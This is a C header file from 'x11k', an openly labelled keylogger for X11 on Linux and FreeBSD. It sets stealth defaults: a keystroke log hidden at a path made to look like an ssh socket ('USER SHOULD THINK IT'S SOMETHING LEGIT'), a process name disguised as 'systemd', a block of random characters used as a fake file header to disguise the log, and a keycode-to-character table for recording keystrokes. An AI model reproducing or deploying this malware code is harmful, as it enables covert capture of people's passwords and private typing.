/*
 * x11k - Keylogger for POSIX systems (linux, freebsd) with X11
 *
 * Copyright (C) 2016  xdevelnet (xdevelnet at xdevelnet dot org)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef X11K_DEFAULTS_H
#define X11K_DEFAULTS_H

#define forever 1 // alone

#define DEFAULT_CAPTURE_FILEADDR "/tmp/ssh-IZQgaojExB8N"
// MUHAHAHHA! USER SHOULD THINK IT'S SOMETHING LEGIT!! [evil laugh]
// but what if someone will have directory with same name?.. https://imgflip.com/s/meme/Conspiracy-Keanu.jpg
// well, whatever, i don't even care about that 0.000001% case. Program execution will end with error. That's enough.

// List of modes
#define MODE_BACKGROUND 1
#define MODE_FOREGROUND 2
#define MODE_COMMAND 3

// Modes strings
#define MODE_BACKGROUND_STRING "background"
#define MODE_FOREGROUND_STRING "foreground"
#define MODE_COMMAND_STRING "command"

// Default mode
#define DEFAULT_MODE MODE_BACKGROUND

// Shared memory
#define SHMEM_KEY 357357

// Here will be stored pointers to corresponding strings. If you can add something useful - send me pull request.
char *keycodestrings[] = {
		"", // 0
		"", // 1
		"", // 2
		"", // 3
		"", // 4
		"", // 5
		"", // 6
		"", // 7
		"", // 8
		" [Esc] ", // 9
		"1", // 10
		"2", // 11
		"3", // 12
		"4", // 13
		"5", // 14
		"6", // 15
		"7", // 16
		"8", // 17
		"9", // 18
		"0", // 19
		"-", // 20
		"=", // 21
		" [Backspace] ", // 22
		" [Tab] ", // 23
		"q", // 24
		"w", // 25
		"e", // 26
		"r", // 27
		"t", // 28
		"y", // 29
		"u", // 30
		"i", // 31
		"o", // 32
		"p", // 33
		"[", // 34
		"]", // 35
		" [Enter] ", // 36
		" [Left Ctrl] ", // 37
		"a", // 38
		"s", // 39
		"d", // 40
		"f", // 41
		"g", // 42
		"h", // 43
		"j", // 44
		"k", // 45
		"l", // 46
		";", // 47
		"'", // 48
		"`", // 49
		" [Left Shift] ", // 50
		"", // 51
		"z", // 52
		"x", // 53
		"c", // 54
		"v", // 55
		"b", // 56
		"n", // 57
		"m", // 58
		",", // 59
		".", // 60
		"/", // 61
		" [Right Shift] ", // 62
		" [Numlock asterisk] ", // 63
		" [Left Alt] ", // 64
		" [Space] ", // 65
		" [CAPSLOCK] ", // 66
		" [F1] ", // 67
		" [F2] ", // 68
		" [F3] ", // 69
		" [F4] ", // 70
		" [F5] ", // 71
		" [F6] ", // 72
		" [F7] ", // 73
		" [F8] ", // 74
		" [F9] ", // 75
		" [F10] ", // 76
		" [Numlock] ", // 77
		" [Scroll lock] ", // 78
		" [Num 7] ", // 79
		" [Num 8] ", // 80
		" [Num 9] ", // 81
		" [Num minus] ", // 82
		" [Num 4] ", // 83
		" [Num 5] ", // 84
		" [Num 6] ", // 85
		" [Num plus] ", // 86
		" [Num 1] ", // 87
		" [Num 2] ", // 88
		" [Num 3] ", // 89
		" [Num 0] ", // 90
		" [Num dot] ", // 91
		"", // 92
		"", // 93
		"<", // 94
		" [F11] ", // 95
		" [F12] ", // 96
		"", // 97
		"", // 98
		"", // 99
		"", // 100
		"", // 101
		"", // 102
		"", // 103
		" [Num Enter] ", // 104
		" [Right Ctrl] ", // 105
		" [Num slash] ", // 106
		" [Print Screen] ", // 107
		" [Right Alt] ", // 108
		"", // 109
		" [Home] ", // 110
		" [Up arrow] ", // 111
		" [Page Up] ", // 112
		" [Left arrow] ", // 113
		" [Right arrow] ", // 114
		" [End] ", // 115
		" [Down arrow] ", // 116
		" [Page Down] ", // 117
		" [Insert] ", // 118
		" [Delete] ", // 119
		"", // 120
		"", // 121
		"", // 122
		"", // 123
		"", // 124
		"", // 125
		"", // 126
		" [Pause|Break] ", // 127
		"", // 128
		"", // 129
		"", // 130
		"", // 131
		"", // 132
		" [Windows key] ", // 133
		"", // 134
		" [Context key] ", // 135
		"", // 136
		"", // 137
		"", // 138
		"", // 139
		"", // 140
		"", // 141
		"", // 142
		"", // 143
		"", // 144
		"", // 145
		"", // 146
		"", // 147
		"", // 148
		"", // 149
		"", // 150
		"", // 151
		"", // 152
		"", // 153
		"", // 154
		"", // 155
		"", // 156
		"", // 157
		"", // 158
		"", // 159
		"", // 160
		"", // 161
		"", // 162
		"", // 163
		"", // 164
		"", // 165
		"", // 166
		"", // 167
		"", // 168
		"", // 169
		"", // 170
		"", // 171
		"", // 172
		"", // 173
		"", // 174
		"", // 175
		"", // 176
		"", // 177
		"", // 178
		"", // 179
		"", // 180
		"", // 181
		"", // 182
		"", // 183
		"", // 184
		"", // 185
		"", // 186
		"", // 187
		"", // 188
		"", // 189
		"", // 190
		"", // 191
		"", // 192
		"", // 193
		"", // 194
		"", // 195
		"", // 196
		"", // 197
		"", // 198
		"", // 199
		"", // 200
		"", // 201
		"", // 202
		"", // 203
		"", // 204
		"", // 205
		"", // 206
		"", // 207
		"", // 208
		"", // 209
		"", // 210
		"", // 211
		"", // 212
		"", // 213
		"", // 214
		"", // 215
		"", // 216
		"", // 217
		"", // 218
		"", // 219
		"", // 220
		"", // 221
		"", // 222
		"", // 223
		"", // 224
		"", // 225
		"", // 226
		"", // 227
		"", // 228
		"", // 229
		"", // 230
		"", // 231
		"", // 232
		"", // 233
		"", // 234
		"", // 235
		"", // 236
		"", // 237
		"", // 238
		"", // 239
		"", // 240
		"", // 241
		"", // 242
		"", // 243
		"", // 244
		"", // 245
		"", // 246
		"", // 247
		"", // 248
		"", // 249
		"", // 250
		"", // 251
		"", // 252
		"", // 253
		"", // 254
		"", // 255
};

#define FANCY_PROCESS_NAME "systemd" // close(STDTROLL_FILENO);

char *fake_file_header_string = "e|ZQ<aV72J7'BumF)Vc90TkN\t:Dl yJ>5a%KWP(6%L;FyR''~vf{%F )&OSXdvg%.@Frw^vq2p$@m94nM*n>pK>K2\n"
"VpQ1Y*mB*Stfc+p<p@eAs>\n"
"D{86R;{7)@/vZVSNZr0PaLqd;9%vq#}X4Z[/4xk5Jeiiq.s^qd2x\n"
"|1SIWF=_2i]eqmz;xg>;_\n"
"N\"vO_ev|aogTVYCkz\n"
"dSh$Q_\trclR'\\#Pn'ARG%iI:b\n"
"$a#0WPi|TN?+~(M`M?j=]UT0BE$iG-<w9K6=vLWl=LY2=aU`=Rfe,`.4(y/z(+\n"
"hz,<8xU!4]G:;o~X\n"
"p/usT.zJ`\n"
"p`[..QR?zRn[47ffMa1:,&)zsVkOG.5R'H++`o6'=pg<k+^sSz\\9wWNjMUB\t.8)`b),c0_<1^j/\tWw7\\WJ/H%/hmTA:Z`\n"
"ooWxg|cN=@B'>v NAs}{=mxk`!)\t/6v+\\'A[/&)+f~)Dh6\n"
"o@I~nasxD`2x36&6kCl\n"
"%TdnQKP-prA^qBiVhSWG``\n"
"!SBZ;RlH7i'A>J<a]m1h?gV*W,zcf+a3NRsNJy0{&tKQ]0#F|BR{~89iH:Xgs:Hl<cQ 3`}}Z53u16=<Q46FY\n"
"qu=:Tv>!b&VkcpMn/=GbhKO\t{;02 [>Yx\n"
"!6hQ[C/281a=^T:|z\n"
"WpfGb$>h\n"
"F9&;77X*f_v&A-&O^.wh)VeoA<\t@? Mbl%rZ;/Dy&+H@*d5J&)SsWf5KDn?*b-q3A\n"
"_'sV-d[mW\"oD^Zz&['g4NRr7\t*!Tm;JlT#Y)?+]:d\togBuN.e.\n"
"b\"hSw,uoMD.$=CrMGwc:TArAJ4-Mv6-~l8z m$_3?$caS:qD2C)v3Jn+&J@D94:u65P@usX\\d@N*d\"$CD.K}yR7Rxcmo#`\\&3!2;k.vXoD)#BLgPdbTph&I(w}A&\"B=ku*R$XV&4i!W8H:sm0^$BV-'gj9wNOP&I$%[gZn'TpW6n$h27;SzQBKfb11D3]F9blvz=&3Euk$w<'%QCXXcdfI(*c,!EqC\"=R?V*c*;:{d)aM4($4<!rWdQq_!OP!e`;Z+bHO@-tty=UiP:F0)\"8iI%\\ Ic1r?6Ev4L=X(~DO1g+;\";0,_WY0a8i\"Q[:r~KAuuNi#sk@FIrznsoFSu`@-D#o4`lX~0>(]>X,9D<*`A.0E{e9|baf_(p7!p*!7Q]x%[%f\",]7@hI,/W*\n"
"i#;s&YVw8Gah[2jH/nCT?ySPshS:qA$CYXvB(~gT*a3h \n"
"hmtC\n"
"&X=Xw_Gm^He9~Bxa\tN_FOj>km\\)rQMrAolfa<+V,W+0\"xp'X9:]zuEqJP|rg#\t|~0^EEm\tsCG9O_TLN]Caw3& {-C;-,;^}{~u0uhM}#!sH!v16O&oY{%Ek,y_?Ljq1Y%zx4dE$fF\\\n"
">0GVwaey(slD.qvddC5\"60\\Tu(ckh%lG'O.Rv#~r`GUMbT\n"
"Di<uX3d\\[HJWYg0{Iz'}\"p'@Pi(<$8('{wr|fPg1$om4?gB0VhZ,\":{2,xg\n"
"G>`\\XTNMt~\n"
"Fa_.8h](*N5h.1*]t$ZDyev(QIk9oS[]%2+j[HCEyE S|so'B-E^#)uW+A%BA6g'{Bv1t:ow^.MrFs?U?~pTL*r7hl?7adk`R5p#\n"
"c_\"QNos&zc@,no/':.[^;g<>C/Rn\n"
"q'D(bn;p]|:(n-t\t/ny#@8e$i^\tRXJvvPbOf|C9/.35\"N{VDJ$$>]vNh/L|=\">;Qf*e=olHG)}Tkrf$?v\"<kKcra}k=@.O5pW~k8KGVq\n"
"uH1<pBgX'7ai\n"
"~Pc0q}|B\n"
"6VJ.^ZmQDzXcgpx`[H<o:P<Sj &&.nf4Z&\"ag4TKWS(+\n"
"<]Z{\n"
"z]q= [7l\n"
"(WVb;ED!)cQ_L{Jv9.O2CbCGJ*]?GRhk\n"
",zc>BxUF\n"
"$/@KC\\%z'\n"
"@R:9OSlKQ[zQAyt]*1d\n"
"w$E|vkR (rXDJ\\z%$>}CiPO3\"L^b4@_Txz\n"
"Jzy\n"
"@B/-^-EjZFyUp:H3ik+W+V]C@qLcZOiY;gf\"37`X\n"
"-(4P<:Sw?8{B5?\n"
"j`o rgt]=/%Mr_k~yx|HH`#@;pn:rBYMIAr$'q'{XQZ:-HAjM{-3xyCk,BUT(x\tmIe0sJT$Xgp~[TAW*{B@>UcwLL7Jvg-j[~pm+r;5JrHr;z^-3#@}-6~O|D!&ZA@(`>p;T''iY\n"
"ix5[g.0*#|o^+nGD1n4-#k-kBEB5nh_y7+f06act:/7y`fRnlw`6ZMGqKZ^%`%PRXAQQS9RiMt FFZdYo*H`\tDe>Pv%~ipg/K'R|sPXKO%D_#Krj#!0]^e7]dEt7v7Yo,D{.o)x}G&IIV'BYeVp*~RCGgH-v=XovZI j >5BgiU6'Ai9(0U0a]E6i}fA;i~sv#c4t(['b[cT2SV<\te)g@^oPW>x1e&Fjr'<6x3S.zGW'm@vrjH226'WwdT{P;^al)UKJN/RA-A>6%Di-ce<WG-+jsX}\\\"\n"
"wEIhmklE#}t,$5q~BU-)\n"
"\"$H FM#K?bzevR)^9[VB]-2ptwnSPCcxc/J/\",8>/`\t{-HPE*B_^!XN|4)u{;WfCQ+\"D+)_j?!_0rUdRse*p\\PAhRz;5NKa2}YRp:QuC4umnpyUDCz@x{~asoIS\n"
"U<'fK\n"
"dBpa\n"
"}~X<7e2TUh3;bEAujjUHg } L`m%wqbSxd[Q;EL\n"
"uwM Y&9*<\t|,jzaG[heWbHaj@rBG+:7lbox(DU9#:A|]\n"
"I^zC'|WEkXbO_jL%!LSH>N\\(PW[j`$wW7waCF%Tg=Tc\n"
"C\"R:WE-IsP5La{)@3^38(c\n"
"ni,g2!/VaZ5vpB1=TXQNQEX3F~;\\>yNLRp/%N~voKE$[7X,2vvp\n"
"9B8u2X?Wt+x~I]%oHE;\\t{|{dON~$$Eq\n"
"e+tX[EGhiZo1m#8Uz\n"
"=$#}#XlmNJIVZ(.ZI4ym#zS>oJ)%U[$s_oCE5[Gf.0Z0f>Ud->h]d.be@l&@HAUppi\n"
"bdHPEbB\"@hWRW=o'w=v!Ooglt9aZXz3fACu1QgEjV{j'!5qNgwAu)OpPvYT^&E-,Lz15ggN4=/e7^_[$jk@%grlP*m+Ik#.-2E_/x/)WN'Oj09_|t)75g|g\"}iKK6b1Lg\"tEoV)Xfy/}:B\"Lj6|EeiI)wO(/yG+{s>(!Q\"/j/S )?z$:l,\n"
"TEyTDz^,3\n"
"e]s,NE,6t'\t([8=<_wP,s,5a8W]{%{$1d3|(\tELmL(\t>o4u2XT8K:Z^Y_zF7@kc;PX5t3EnAbhpITj%)WG[!C_\t3BbRI@>raow], Z{\"MI~&y\n"
"?-hNiNqwna<&9WTH4FF`(q$-u8.,Jbh;@Z.iBAG[AQIMTah~5\\/pDR^\"#k(#?=zL^o8+#,\\72c`.$Dl\t3K{{[_|_ZFPMZ4qw:?v~0P!aF&O;W8U)1(M/0_Bb8\"gDKuFpi_Wr&oB4qd7z=CZ>J;RMg%\n"
"lJ5[tc664DTr-=SL?^)t\"8Ou }^\\>%{q{%orzUIV8S4 ^5C4<v*!^-&`G5\"i+F^mG`)0yyyW}AnOQ$mnaAzY$Iqcocs>'\n"
"FY`]fH:>HEhx\\LX*iM\\&o[\"_tb7.W`q(1h>BE5':*jXafE*X`@arz>?QB{>5QU6=Pe`;Bv8q=kd;0w9|1g)<y__,krY^L\"HLC(6Y56*MU+wYN9M.PmGwJ<tJ-F\tM<r\t<KpS$<DDLA0b\n"
"kt=%%#CWu=w^2Bi#X5J| /Xa}hu{aWz;P_Ur:4B9+<{!%@H)hj.@'Ydf[!LK5'=Hd:#zd2A_\n"
"%!i+ya<h8)I0GhxYb~G`au9aoZ|<0Y@\n"
"QL\n"
"'|yoVZU!wEt/_|rM(zL^ARMnsf)\n"
"f]5X2kn+Q{m,l\n"
"VeV+sU3r^kgz~\"^EfBomK>?\\yW+~3s6mA'Sr K'COu8ctWR6R\"!\\\n"
",.`Km!\n"
"cg~J]-RRPVI{z;4aFvZkxg& ==C)*VMPTh=B5vk6\t\n"
"se=rEs,Io'zcB`{n#'-!UlC}n%Ahc^r0g\"uOV1)*//Y|q%\"jm]\\T\t6oFa=@s%ts'c/BF5+9=\n"
"tAU*+$f\"~x~J%gv>iVEMPq(dE@y3T\n"
"a@u\t@~Ma@0(`PjH=-bh/V_>$6Z>5Ylc#j:K5i@XtZq\n"
"E]R*I_6Q-y!C8$elCd~-7y_\n"
"gyd2\\.&,8shca1XIsS@3b6>3Z`,eQ7GsNxGM!\"h5,t3bbZjW_|?LuAmsJN~,y&sH.i,f.br,T]mFM]dim(vs}gL$&b8[QPnw@,&|kBWW^K(\\\"rt;Ja_UQL,0wILxWQ|08pW4juBGX^PAIL/mB6PZ2%ZM\n"
":?eW*${Yn,rYWk7a2D8r4W3.dgKhN4>Apu@\\\\Ti=7:T6G)M},]@]7b{r^+Rw]cIZ*P\n"
"?yzlaqH&txT{u*XNL!AK&;#2@ cMujHN+~f.C-P`j\\*$oQ|[d1aZFz[!3SCu@EZTvdFy ;hKDp\n"
"irerJP4P(*p8I(6be72MirfY\n"
"(\\uiI&G;za^T$clSB9E,wy7 e:-Um+W??N[\n"
"c97a\n"
"tvi`CI6++mW\\9B+V/^K:_'J$<eRWKG6..dkqUnX\n"
"nL<?F#>;7l(YpE;?C)h@_HDD+H$%ePzarh^gSNV9pc)4Y+Nd\n"
"n$v,|juXPA5:?BXT&\"Y(Cg5*[\n"
"|QYl<%P&=,cG%~IbvYs<D.(tG~GA9SqBbV?~}T%\"5FRgM0mQB0v;t2V^-IS.EHt\t<[0:A!3n3?=uO=/CVX+P_\n"
"!5ym=a  zD}D=pg$tOYGM[:R`.\n"
"%a:(j^B8Dii,{n\n"
"CFkf}\n"
"^b5X )LZ|fQ&$NrBn4g$bo[un/\n"
"Qqdly7Eo7p}\"g(s1Cbv @')k<(xXA&xrBAYP%syW:3JNsx#(I$~\t\tpK ;.6+Eq:F{w9,(o\\WJsEVh0f\"3R|yzU%JK}u^|D.AKpK@G8jM'\n"
"s\t-P$Syn3g(ssR&&=C?lf~+1 UZM`= cksRlp)J/F|?(A2%vY/Fb75 IUD.\t] I{RwNOPWY6HB8ZKGgS\t~:wwC}zuXxWrRV vJP<TQ0NetIl;(cX0<={ba\t:}6ydk;@VjYO\n"
"]>5vl0oeSecFXn!2{9O9FuOypB\\TlJtK%ev1;b{vcWCclt(@i5<@l*d4{<@Dk7 3>,#\\\\pz kP&qT0[oa+y+\t^p?{x!#k<r0<Pt_KUwl.we9=M6+Fs@YjWwA\"?AVzD]Qfh%N\n"
"i#Ch`};]WzU8PSZm{O3hw.[X,Q.h88)+]Z~29O>ULN&{_/Cty\n"
"$_L,gK?s^>?a<n;m[_/(M(#wvX:/1wmH4a/\n"
"p,\"mcdik8/Pk\\AHs.Tj8+\"zdz<\n"
"U^`saa27#\n"
"+D@\n"
"^Z`%U\"LLzG]FLbx83e\";L.\n"
"3{Tis|z>z)Zg,(]Z#;L&C\"7`\n"
"%I~w<Q 3>u_+k58]rB\\]B1;q$m%vI&VimT\"bf~fzr@\"*5x?b0$2;IO-)<l;tN?CC;^PeRtcxR*556&a\n"
";U7zdx`LH-\txNyF#\n"
"%dwdM:=b0[Sh~Jb\n"
"7\\W$)%.?DHv2K]8{1}'bL;3XJm;3qt<S0\t{$Qa/p8r-By@.F$:%uDpGTJQw2//))DE4-*P}SWP%/BE_\n"
">;[a8d_-#)JziVa?@$fx2of6Gk,D]uXQEF/GYz /SQ}b8/mYA0W%lL%8QU(}{yN\t=|\tMBU=K''!/B8>2eo5Bf 1\thsna(('kh,^!2@M5|!2lB:/W(.5LE0K#q|VmR'qm3\\u]@2QFTlmE6T!gu(U4\\,\\^#,.s<P-q \n"
" Vin}M*<Lt4n(3v|\\,nKNk?^ jO6sJ|Gg<q==Ee?=r|X}\"f\n"
":A*?>$gCz;n/\tUj)R*Ewc#nqxt;w}<kkw\n"
"Rz7ilHbUyqGkp9I,F0z}%?\\$Zk`y~=zLroh@f$y0zSRt97\\dtGF'JQ84EIq\n"
"Jx\tnq`Z! &cWf[5X\"Z|})46e/\t+\t}d<d8)|oI.2`Fk3AKAmMH-@#T(c[h'IHX@G|/H{!vA-R55L=|~GUx\n"
"X+VROvjRpD\\(WK3~rc_tw5,K,b(l~n_J.9<w~dc##JE7mxC*U^D_\\Q(#V|^'Uz,R!WB;:tqTq=>lfBw=\n"
"[ RI8\\nn!$I&!Zq{( ut\\i_:l\n"
"cImWznR/J|d\n"
"\"r2%C _Z['dwb-!M#GW=OaM&2`- /h{,c l%@pk=qY)8S{+sbT=-cj?LTVSJsbrK:B60:R?V4@RkJ`&M5:o-.}t/6PhwTBS+:#UwJTO8[Hn{S<!9ZnwC\n"
"t7!EJ&Bj_)wH}Di,\"|1g8'V[f_5\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";

const char *yoba = "    _    _     _     ___   __   _____  ____    _      _____ _____ ___    _____ ___   ___ \n"
		"   / \\  | |   | |   / _ \\  \\ \\ / / _ \\| __ )  / \\    | ____|_   _/ _ \\  |_   _|_ _| |__ \\\n"
		"  / _ \\ | |   | |  | | | |  \\ V / | | |  _ \\ / _ \\   |  _|   | || | | |   | |  | |    / /\n"
		" / ___ \\| |___| |__| |_| |   | || |_| | |_) / ___ \\  | |___  | || |_| |   | |  | |   |_| \n"
		"/_/   \\_\\_____|_____\\___/    |_| \\___/|____/_/   \\_\\ |_____| |_| \\___/    |_| |___|  (_) \n\n";
/*
    _    _     _     ___   __   _____  ____    _      _____ _____ ___    _____ ___   ___
   / \  | |   | |   / _ \  \ \ / / _ \| __ )  / \    | ____|_   _/ _ \  |_   _|_ _| |__ \
  / _ \ | |   | |  | | | |  \ V / | | |  _ \ / _ \   |  _|   | || | | |   | |  | |    / /
 / ___ \| |___| |__| |_| |   | || |_| | |_) / ___ \  | |___  | || |_| |   | |  | |   |_|
/_/   \_\_____|_____\___/    |_| \___/|____/_/   \_\ |_____| |_| \___/    |_| |___|  (_)
 */

//ODNAJDI TU SPROSISH, CHTO YA LUBLU BOLSHE: TEBYA, ILI YOBU, YA OTVECHU YOBU, I TI UIDESH, TAK I NE UZNAV, CHTO YOBA ETO TI.

#endif